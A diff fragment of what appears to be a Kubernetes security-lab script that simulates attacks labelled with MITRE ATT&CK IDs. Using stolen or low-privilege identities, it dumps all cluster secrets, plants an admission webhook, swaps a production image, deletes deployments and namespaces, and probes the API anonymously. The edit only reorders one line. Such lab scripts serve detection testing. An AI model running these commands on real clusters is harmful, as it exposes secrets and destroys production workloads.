@@ -74,13 +74,13 @@ attacks() {
   run attack bob-stolen T1528 "client certificate request" -- $K $(as bob) create -f /opt/lab/csr-$i.yaml
   run attack bob-stolen T1546 "mutating admission webhook" -- $K $(as bob) create -f /opt/lab/manifests/webhook.yaml
   run attack bob-stolen T1552.007 "dump all secrets" -- $K $(as bob) get secrets -A -o yaml
-  run attack bob-stolen T1485 "delete prod deployment" -- $K $(as bob) -n prod delete deployment api
   run attack mallory T1611 "host IPC pod" -- $K $(as mallory) -n dev apply -f /opt/lab/manifests/hostipc.yaml
   run attack mallory T1098 "bind herself to admin (denied)" -- $K $(as mallory) -n dev create rolebinding self-admin-$i --clusterrole=admin --user=mallory
   run attack bob-stolen T1609 "debug container in prod" -- $K $(as bob) -n prod debug deploy/api --image=busybox:1.36 --profile=sysadmin -- true
   run attack bob-stolen T1195 "image swap on prod deployment" -- $K $(as bob) -n prod set image deployment/api nginx=busybox:1.36
   run attack bob-stolen T1021 "port-forward into prod" -- timeout 3 $K $(as bob) -n prod port-forward deploy/api 18081:80
   run attack bob-stolen T1485 "delete a namespace" -- sh -c "$K create namespace tmp-$i >/dev/null 2>&1; $K $(as bob) delete namespace tmp-$i --wait=false"
+  run attack bob-stolen T1485 "delete prod deployment" -- $K $(as bob) -n prod delete deployment api
   run attack anonymous T1046 "anonymous API probing" -- curl -sk "$API/api/v1/namespaces/kube-system/secrets"
   run attack anonymous T1046 "anonymous API probing (pods)" -- curl -sk "$API/api/v1/pods"
   $K -n kube-system delete daemonset ks-agent >/dev/null 2>&1; $K delete csr lab-csr-$i >/dev/null 2>&1
